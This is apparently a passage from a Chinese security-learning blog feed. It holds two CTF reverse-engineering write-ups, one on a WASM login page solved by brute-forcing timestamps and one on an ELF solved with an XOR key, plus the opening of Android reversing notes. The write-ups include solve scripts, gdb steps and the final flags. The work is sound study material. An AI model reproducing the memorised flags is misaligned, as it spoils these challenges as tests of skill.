<h4 id="刚开始写题的想法"><a href="#刚开始写题的想法" class="headerlink" title="刚开始写题的想法"></a><a href="1">刚开始写题的想法</a></h4><p>​	刚开始写题的时候，就面临一个问题：当我打开<code>Index.html</code>的时候是直接双击打开，我根本不知道<code>file协议</code>，我也不知道当我们看见有<code>fetch</code>的时候是不能用<code>file</code>的，所以当我输入用户名和密码的时候既没有错误报错和正确提示，我感到很疑惑，为什么html代码里明明就有关于这部分的代码，但是我却触发不了。我就去问gemini，是因为我们是需要用http协议的（具体在<a href="4">相关知识点</a>中说），后来我就在终端中<code>python -m http.sever 8000</code>，然后在浏览器中打开<code>http://localhost:8000</code>。这是我遇见的第一个问题。</p>
<p>​	第二个问题就是，我发现wasm文件是二进制文件，我在想要不要反编译它，虽然我最后还是反编译了，但是说实话，代码挺混乱的（<code>wasm2c release.wasm -o release.c</code>这里你也可以反编译成wat代码），很长很乱，我根本不知道怎么看</p>
<p>​	第三个问题，到最后我知道是进行时间戳爆破，判断MD5值的开头是否和<code>ccaf33e3512e31f3</code>一样，但是这个时间格式是什么？？？因为一个空格一个横线都会导致MD5的值不同，那我们使用什么格式呢？？？</p>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a><a href="2">题解</a></h4><p><strong>题目</strong> 是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">某人本想在2025年12月第三个周末爆肝一个web安全登录demo，结果不仅搞到周一凌晨，他自己还忘了成功登录时的时</span><br><span class="line">间戳了，你能帮他找回来吗？提交格式为flag&#123;时间戳正确时的check值&#125;。是一个大括号内为一个32位长的小写十六进</span><br><span class="line">制字符串。</span><br></pre></td></tr></table></figure>

<p>我们先看看题目给我们的附件</p>
<img src="/2026/01/05/2025%E9%95%BF%E5%9F%8E%E6%9D%AF-wasm-login/1.png" class="" title="This is an example image">

<p>看到这里的时候我们就知道它可能是一个Js逆向</p>
<p>我们将这个网页打开，注意不能直接点开html文件（直接打开用的是file协议），这里我们要用http协议。</p>
<p>我们使用</p>
<ol>
<li>python -m http.server 8000</li>
<li>在浏览器中访问url:<code>http://localhost:8000</code></li>
</ol>
<p>这是正确打开网页的方式，打开网页之后我们可以看到这是一个登录页面，我们可以看看它的源代码</p>
<p>在代码的最后一行有</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 测试账号 admin 测试密码 admin--&gt;</span></span><br></pre></td></tr></table></figure>

<p>说明我们的账号和密码都是<code>admin</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">simulateServerRequest</span>(<span class="params">data</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 模拟网络延迟</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// 实际应用中这里应该是真实的 API 请求</span></span><br><span class="line">              <span class="comment">// 这里仅作演示，使用本地判断</span></span><br><span class="line">              <span class="keyword">const</span> check = <span class="title class_">CryptoJS</span>.<span class="title class_">MD5</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>);</span><br><span class="line">              <span class="keyword">if</span> (check.<span class="title function_">startsWith</span>(<span class="string">&quot;ccaf33e3512e31f3&quot;</span>))&#123;</span><br><span class="line">                <span class="title function_">resolve</span>(&#123; <span class="attr">success</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">              &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title function_">resolve</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;, <span class="number">1000</span>);</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>最重要的是<code> CryptoJS.MD5(JSON.stringify(data)).toString(CryptoJS.enc.Hex);</code>我们逐步分析</p>
<ul>
<li><code>JSON.stringify(data)</code>，将data(wasm返回的对象)转化成标准json字符串，因为md5只能处理字符串或二进制数据，不能直接处理js对象</li>
<li><code>CryptoJS.MD5(...)</code>，对上一步得到的字符串进行MD5哈希运算</li>
<li><code>.toString(CryptoJS.enc.Hex)</code>将加密后的数据转化成16进制字符串</li>
</ul>
<p>得到该16进制字符串后，将它的开头和<code>ccaf33e3512e31f3</code>进行对比，如果一致则success</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用 WASM 中的 authenticate 函数</span></span><br><span class="line"><span class="keyword">const</span> authResult = <span class="title function_">authenticate</span>(username, password);</span><br><span class="line"><span class="keyword">const</span> authData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(authResult);</span><br></pre></td></tr></table></figure>

<p>我们需要查看wasm文件的内容，但是因为它是二进制编码，所以我们将它反编译成可读的wat文件，有很多方法，这里我说两种</p>
<ol>
<li>使用<a href="https://webassembly.github.io/wabt/demo/wasm2wat/">在线网站</a></li>
<li>使用<code>wasm2wat</code>进行反编译</li>
</ol>
<p>我们可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(import &quot;env&quot; &quot;abort&quot; (func $env.abort (type $t6)))(import &quot;env&quot; &quot;Date.now&quot; (func $env.Date.now (type $t9)))</span><br></pre></td></tr></table></figure>

<p>它调用了Date.now()</p>
<p>可以猜测，authenticate 函数结合用户名，密码，时间戳参数进行签名计算</p>
<p>我们修改<code>Date.now()</code>函数为我们自定义函数，对时间戳进行重放爆破，然后将authenticate 函数作为黑盒调用，寻找目标签名值。</p>
<p>完整exp</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createHash &#125; <span class="keyword">from</span><span class="string">&quot;node:crypto&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; authenticate &#125; <span class="keyword">from</span><span class="string">&quot;./build/release.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> P = <span class="string">&quot;ccaf33e3512e31f3&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> u = <span class="string">&quot;admin&quot;</span>, p = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">T</span> = (<span class="params">x</span>) =&gt; (<span class="regexp">/^\d+$/</span>.<span class="title function_">test</span>(x) ? +x : <span class="keyword">new</span> <span class="title class_">Date</span>(x).<span class="title function_">getTime</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> s = <span class="title function_">T</span>(process.<span class="property">argv</span>[<span class="number">2</span>] ?? <span class="string">&quot;2025-12-22T00:00:00+08:00&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> e = <span class="title function_">T</span>(process.<span class="property">argv</span>[<span class="number">3</span>] ?? <span class="string">&quot;2025-12-22T06:10:00+08:00&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> t = s; t &lt;= e; t++) &#123;</span><br><span class="line"><span class="title class_">Date</span>.<span class="property">now</span> = <span class="function">() =&gt;</span> t;</span><br><span class="line"><span class="keyword">const</span> j = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title function_">authenticate</span>(u, p)));</span><br><span class="line"><span class="keyword">const</span> h = <span class="title function_">createHash</span>(<span class="string">&quot;md5&quot;</span>).<span class="title function_">update</span>(j).<span class="title function_">digest</span>(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (h.<span class="title function_">startsWith</span>(P)) &#123; </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;命中时间戳:&quot;</span>, t); </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;对应时间:&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>(t).<span class="title function_">toString</span>());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;最终结果:&quot;</span>, h); </span><br><span class="line">    <span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关键</strong></p>
<ol>
<li><p><code>Date.now = () =&gt; t;</code></p>
<p>我们强行修改了全局的<code>Date.now()</code>函数</p>
<p>WASM内部会调用<code>Date.now()</code>来获取当前时间戳，通过这一行，让WASM每运行一次都以为“现在”就是我们指定的那个毫秒，这就是重放爆破</p>
</li>
<li><p><code>const j = JSON.stringify(JSON.parse(authenticate(u, p)));</code></p>
<p><strong>步骤</strong>：</p>
<ol>
<li><code>authenticate(u, p)</code>：让 WASM 按照我们伪造的时间 <code>t</code> 算出一串结果。</li>
<li><code>JSON.parse(...)</code>：把结果变回对象。</li>
<li><code>JSON.stringify(...)</code>：再变回标准的 JSON 字符串。</li>
</ol>
<p><strong>为什么这样写</strong>：这叫 <strong>“标准化”</strong> 。为了防止 WASM 返回的字符串里多一个空格、少一个换行导致 MD5 匹配失败。我们必须保证字符串格式和服务器（网页）校验时完全一致。</p>
</li>
</ol>
<p>我们在终端运行脚本</p>
<img src="/2026/01/05/2025%E9%95%BF%E5%9F%8E%E6%9D%AF-wasm-login/2.png" class="" title="This is an example image">

<p>得到结果：<code>flag&#123;ccaf33e3512e31f36228f0b97ccbc8f1&#125;</code></p>
<h4 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a><a href="3">总结与反思</a></h4><p>做题的时候，有几个问题需要改正</p>
<ol>
<li>在冗余的代码中没有必要弄清楚每一个细节，有时候需要合理的猜测</li>
<li>在脚本中，我是需要爆破时间戳的，但是我一直想的是去换格式，我们是可以使用<code>JSON.stringify(JSON.parse(authenticate(u, p)));</code>,这里的<code>authenticate(u, p)</code>是一个黑盒调用，会自动生成时间戳。</li>
<li>当我们不太清楚函数内的逻辑时，就可以进行黑盒调用</li>
</ol>
<h4 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a><a href="4">相关知识点</a></h4><h4 id="file协议与Http协议的区别"><a href="#file协议与Http协议的区别" class="headerlink" title="file协议与Http协议的区别"></a>file协议与Http协议的区别</h4><p>file协议主要用于本地计算机中的文件，好比通过资源管理器打开文件一样，它主要是针对本地的，即file协议是访问本地的资源，并且file协议无法实现跨域。</p>
<p>http访问本地的html文件，相当于本机作为一台http服务器，然后通过localhost访问自己电脑上的本地服务器。</p>
<p><strong>file只是请求了本地文件，将其作为静态文件打开，而http是在本地搭建了一个服务器再通过服务器去动态解析拿到文件</strong></p>
<p><strong>但是在这道题中我们为什么知道这是用http协议打开的而不是使用file协议</strong>，主要原因如下：</p>
<p>本道题涉及wasm，必须使用http协议（启动一个本地服务器）</p>
<ol>
<li><p><strong>跨域安全限制</strong></p>
<p>WebAssembly文件(.wasm)不能像图片那样直接加载，需要通过JavaScript的<code>fetch()</code>或者<code>WebAssembly.instantiateStreaming()</code>接口来获取数据</p>
<ul>
<li><strong>file协议：</strong> 浏览器出于安全考虑，严格限制<code>file://</code>协议下的脚本去读取本地文件系统中的其他文件。浏览器会认为这是”跨域请求”，从而拦截掉加载<code>.wasm</code>的行为。</li>
<li><strong>http协议：</strong> 浏览器允许在同一域名（如localhost）下下载相关资源，这符合当代浏览器的安全模型。</li>
</ul>
<p>这道题代码内部使用了fetch，并且我们还需要AssemblyScript的标准加载器来获取<code>release.wasm</code></p>
<ol>
<li>如果使用file协议，在控制台（F12）会报错，提示无法加载<code>wasm</code>文件</li>
<li>如果使用http协议，所有文件都在服务器语境下，浏览器能正确获取文件，校验类型并运行逻辑</li>
</ol>
</li>
</ol>
<p>如果我们想快速开启<code>http</code>环境，可以在代码所在文件夹打开终端输入：</p>
<ul>
<li><strong>Python3：</strong> <code>python -m http.server 8000</code></li>
</ul>
<h4 id="为什么这个exp可以不用考虑时间的格式？"><a href="#为什么这个exp可以不用考虑时间的格式？" class="headerlink" title="为什么这个exp可以不用考虑时间的格式？"></a>为什么这个exp可以不用考虑时间的格式？</h4><p>我们使用“黑盒”，之所以不需要知道时间的格式，是因为在这个过程中，没有去手动”写”时间字符串，而是通过劫持系统函数，让程序自发地生成了正确的格式。</p>
<ol>
<li><p>在脚本中我们使用了<code>Date.now = () =&gt; t;</code>，它并不接收你传进去的字符串，而是调用系统接口获取当前毫秒数。当wasm拿到这个数字之后，它会用它自带的转换逻辑去生成JSON里面的时间字段。既然WASM在你的电脑上运行和在服务器上运行的是同一个文件，那么他生成的时间格式的逻辑（比如有没有小数点，是不是13位）就一定是一模一样的。</p>
</li>
<li><p><strong><code>JSON.parse(...)</code></strong> ：把这一串文本拆解回了 JavaScript 的“纯数据对象”。在对象状态下，<strong>格式是不存在的</strong>，只有键值对。</p>
<p><strong><code>JSON.stringify(...)</code></strong> ：把你拆解出来的“纯数据”重新按照 Node.js 的标准打包。</p>
</li>
</ol>
<p>好长时间没写blog了，期末考试结束了，我终于可以再次拿起键盘了hhhh</p>
]]></content>
      <tags>
        <tag>wasm</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>2025金盾信安杯-逆向题目lower</title>
    <url>/2026/01/07/2025%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF-%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AElower/</url>
    <content><![CDATA[<h2 id="2025金盾信安杯-lower"><a href="#2025金盾信安杯-lower" class="headerlink" title="2025金盾信安杯 lower"></a>2025金盾信安杯 lower</h2><p><a href="">2025金盾信安杯 逆向题目lower</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#1">题目分析及截图</a></li>
<li><a href="#2">相关知识点</a></li>
</ul>
<hr>
<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a href="#1">题目分析及截图</a></h4><p>这道题代码不是很长，并且需要你动态调试+静态分析才能解出这道题。</p>
<p>那么我们依旧先查壳</p>
<img src="/2026/01/07/2025%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF-%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AElower/1.png" class="" title="This is an image">

<p>可以看到我们不需要进行脱壳，并且这是一个64位elf文件</p>
<p>我们使用ida打开该文件</p>
<ol>
<li><p><strong>Main</strong> 函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v8; <span class="comment">// zf</span></span><br><span class="line">  __int64 (__fastcall *v9)(); <span class="comment">// rax</span></span><br><span class="line">  __int64 (__fastcall *v10)(); <span class="comment">// rdx</span></span><br><span class="line">  _BYTE v12[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-178h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+50h] [rbp-128h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+158h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">fgets</span>(s, <span class="number">256</span>, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0LL</span>;</span><br><span class="line">    v4 = <span class="number">-9218LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="type">unsigned</span> __int8)s[v3];</span><br><span class="line">      v6 = v3;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)v5 &lt;= <span class="number">0xDu</span> &amp;&amp; !_bittest64(&amp;v4, v5) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++v3 == <span class="number">256</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = <span class="built_in">derive_vm_seed</span>();</span><br><span class="line">    v8 = (((<span class="type">unsigned</span> __int8)(((v6 ^ v7 ^ <span class="number">0xCAFEBABE</span>) &gt;&gt; <span class="number">11</span>) ^ ((v6 ^ v7 ^ <span class="number">0xCAFEBABE</span>) &gt;&gt; <span class="number">5</span>)) ^ (<span class="type">unsigned</span> __int8)(v6 ^ v7) ^ <span class="number">0xBE</span>) &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">    v9 = check_len_alt_impl;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">      v9 = check_len_impl;</span><br><span class="line">    v10 = run_and_verify_alt_impl;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">      v10 = run_and_verify_impl;</span><br><span class="line">    g_check_ops = v9;</span><br><span class="line">    off_5020 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))v10;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> <span class="built_in">int</span> (__fastcall *)(_QWORD, __int64, __int64 (__fastcall *)(), __int64 (__fastcall *)()))v9)(</span><br><span class="line">           v6,</span><br><span class="line">           <span class="number">256LL</span>,</span><br><span class="line">           v10,</span><br><span class="line">           run_and_verify_impl)</span><br><span class="line">      &amp;&amp; (<span class="built_in">off_5018</span>(v12, v6), (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">off_5020</span>(s, v6, v12)) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>我们慢慢来分析这个函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="type">unsigned</span> __int8)s[v3];</span><br><span class="line">      v6 = v3;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)v5 &lt;= <span class="number">0xDu</span> &amp;&amp; !_bittest64(&amp;v4, v5) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++v3 == <span class="number">256</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的意思就是看我们输入字符的长度</p>
<img src="/2026/01/07/2025%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF-%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AElower/2.png" class="" title="This is an image">

<p>但是当我们输入的时候是有报错的，说明输入可能是有某些限制的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">check_len_impl</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 == <span class="number">79</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>check_len_impl</code>中我们可以看到<code>return a1 == 79</code>从这个函数名我们也可以大概猜到这个函数是用来检查输入的长度是否等于79的，我们可以再试一次长度是79的输入</p>
<img src="/2026/01/07/2025%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF-%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AElower/3.png" class="" title="This is an image">

<p>这次是通过的（我只是为了验证输入79个字符是正确的，真正比赛不用这样，时间第一）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ((<span class="type">unsigned</span> <span class="built_in">int</span> (__fastcall *)(_QWORD, __int64, __int64 (__fastcall *)(), __int64 (__fastcall *)()))v9)(</span><br><span class="line">           v6,</span><br><span class="line">           <span class="number">256LL</span>,</span><br><span class="line">           v10,</span><br><span class="line">           run_and_verify_impl)</span><br><span class="line">      &amp;&amp; (<span class="built_in">off_5018</span>(v12, v6), (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">off_5020</span>(s, v6, v12)) )</span><br></pre></td></tr></table></figure>

<p>这个if判断是非常重要的，就是验证你的输入长度是否等于79，加密后是否等于密文</p>
<p>我们跟进<code>run_and_verify_impl</code>函数看看</p>
<p>但是我们进去之后没有什么有用的信息，我们继续跟进，还是没有什么有用的函数，继续跟进，发现<code>run_vm_inner</code>函数</p>
<p>使用动态调试得到加密后的数组</p>
<p>具体调试步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb ./lower</span><br><span class="line">b run_vm_inner</span><br><span class="line">x/80xb $rdx</span><br></pre></td></tr></table></figure>

<img src="/2026/01/07/2025%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF-%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AElower/4.png" class="" title="This is an image">

<p>它就是我们flag加密后的进行比对的值，接下来我们需要去明白它的加密逻辑</p>
<p>这个在程序中看不到，嗯…比较烦人</p>
<p>我们跟进函数<code>run_ir</code></p>
<img src="/2026/01/07/2025%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF-%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AElower/5.png" class="" title="This is an image">

<p>其实大概率就是进行异或操作了，但是我不知道v13[1]是什么值，动调一下看看呢</p>
<p>动调步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb ./lower</span><br><span class="line">b run_ir</span><br><span class="line">r</span><br></pre></td></tr></table></figure>

<p>在STACK中，我们可以看到一行</p>
<p><code>04:0020│-148   0x7fffffffd6e8 ◂— 0x4000003001aa2000</code></p>
<p>因为是小端序（你可能想问为什么？）</p>
<img src="/2026/01/07/2025%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF-%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AElower/6.png" class="" title="This is an image">

<p>在<code>0x4000003001aa2000</code>中，我们将每两个字符拆开</p>
<p>我们可以和<code>v7 ^= v13[1];</code>上下进行对比，我们倒着看这些数字（因为是小端序）</p>
<ul>
<li><code>0x20：</code>这是XOR的操作码</li>
<li>那么<code>0xAA</code>代表的就是异或的这个值</li>
</ul>
<p><strong>这个涉及操作码（Opcode），可以去看看</strong></p>
<p>可能有更好的办法，但是我不太懂，欢迎来找我讨论</p>
<p>我们的exp如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [</span><br><span class="line">    <span class="number">0xcc</span>, <span class="number">0xc6</span>, <span class="number">0xcb</span>, <span class="number">0xcd</span>, <span class="number">0xd1</span>, <span class="number">0x9d</span>, <span class="number">0xcf</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0x92</span>, <span class="number">0xcb</span>, <span class="number">0x9c</span>, <span class="number">0xc9</span>, <span class="number">0xcb</span>, <span class="number">0x87</span>, <span class="number">0xce</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0xcb</span>, <span class="number">0x98</span>, <span class="number">0x87</span>, <span class="number">0x9b</span>, <span class="number">0x9b</span>, <span class="number">0xcc</span>, <span class="number">0x9a</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x98</span>, <span class="number">0x98</span>, <span class="number">0x87</span>, <span class="number">0x99</span>, <span class="number">0x9a</span>, <span class="number">0x9a</span>,</span><br><span class="line">    <span class="number">0x9f</span>, <span class="number">0x9a</span>, <span class="number">0x9f</span>, <span class="number">0x9d</span>, <span class="number">0x9f</span>, <span class="number">0x9c</span>, <span class="number">0x9b</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0xce</span>, <span class="number">0x87</span>, <span class="number">0x92</span>, <span class="number">0xcf</span>, <span class="number">0x9c</span>, <span class="number">0xcb</span>, <span class="number">0x9e</span>, <span class="number">0x9a</span>,</span><br><span class="line">    <span class="number">0x92</span>, <span class="number">0xc8</span>, <span class="number">0x87</span>, <span class="number">0xce</span>, <span class="number">0xcc</span>, <span class="number">0xcb</span>, <span class="number">0x98</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0x9b</span>, <span class="number">0x9b</span>, <span class="number">0xcc</span>, <span class="number">0x9a</span>, <span class="number">0x87</span>, <span class="number">0x92</span>, <span class="number">0xc9</span>, <span class="number">0x9b</span>,</span><br><span class="line">    <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0x99</span>, <span class="number">0x9a</span>, <span class="number">0x9a</span>, <span class="number">0x9f</span>, <span class="number">0x9a</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x9d</span>, <span class="number">0x9f</span>, <span class="number">0x9c</span>, <span class="number">0x9b</span>, <span class="number">0x98</span>, <span class="number">0xce</span>, <span class="number">0xd7</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(b ^ <span class="number">0xAA</span>) <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密出的字符串: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>结果如下：<code>flag&#123;7e48a6ca-dfa2-11f0-9c22-30050575612d-8e6a408b-dfa2-11f0-8c13-30050575612d&#125;</code></p>
<h4 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a><a href="#2">相关知识点</a></h4><p><strong>操作码（Opcode）</strong>：</p>
<ol>
<li><p>什么是操作码？？</p>
<p><strong>操作码</strong> 是指令中规定“执行什么操作”的部分。它像是一个开关，决定了CPU接下来要走那条电路逻辑</p>
<ul>
<li>**它的本质：**只是一个数字。</li>
<li><strong>他的意义：</strong> 由程序中的<code>if else</code>或者<code>switch</code>分支赋予</li>
<li><strong>操作数（Operand）：</strong> 紧跟在操作码后面的数据（比如我们异或操作的<code>v13[1]</code>）</li>
</ul>
</li>
<li><p>怎么在程序中找到操作码？</p>
<p>找到一个自定义VM的操作码的映射关系，通常遵循 <strong>取指 -&gt; 分发 -&gt; 逻辑</strong> 的寻找路径。</p>
<p><strong>取指</strong></p>
<ul>
<li>程序每三个字节取一次指令</li>
<li>每组字节的第一个字节是操作码</li>
</ul>
<p><strong>分发</strong></p>
<p>在代码中，作者使用了大量<code>if-else</code>分支</p>
<ul>
<li><code>if (v14==17)</code></li>
<li><code>else if (v4 == 1)</code></li>
<li><code>else if (v4 == 32)</code></li>
<li><code>else if (v14 == 48)</code></li>
</ul>
<p>这些数字就是操作码</p>
</li>
<li><p>确定操作码的功能</p>
<ul>
<li>32（10进制），20（16进制），在代码中<code>v7 ^= v13[1]</code>，说明这个操作码的含义就是异或（XOR）</li>
</ul>
</li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Android逆向学习笔记(一)</title>
    <url>/2026/01/08/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/</url>
    <content><![CDATA[<h2 id="安卓逆向学习笔记（一）"><a href="#安卓逆向学习笔记（一）" class="headerlink" title="安卓逆向学习笔记（一）"></a>安卓逆向学习笔记（一）</h2><p><a href="https://www.52pojie.cn/thread-648530-1-1.html">安卓逆向第一课</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#1">学习过程</a></li>
<li><a href="#2">课后作业</a></li>
<li><a href="#3">心理感受</a></li>
</ul>
<hr>
<h4 id="学习过程"><a href="#学习过程" class="headerlink" title="学习过程"></a><a href="#1">学习过程</a></h4><p>第一课，老师是教我们写一个Android程序，这是一个很简单的登录界面。</p>
<p>我们首先下载需要使用的软件<a href="https://developer.android.com/studio?hl=zh-cn">Android Studio</a></p>
<p>下载按照<a href="https://blog.csdn.net/2503_91826368/article/details/147528584">教程</a>一步一步将AS安装好。</p>
<p>下载好之后，因为我没有接触过这个软件也没有玩过开发，所以刚刚开始的时候有点不知道怎么用这个软件。</p>
<p>但是没关系。学逆向的人内心是应该有这些准备的。</p>
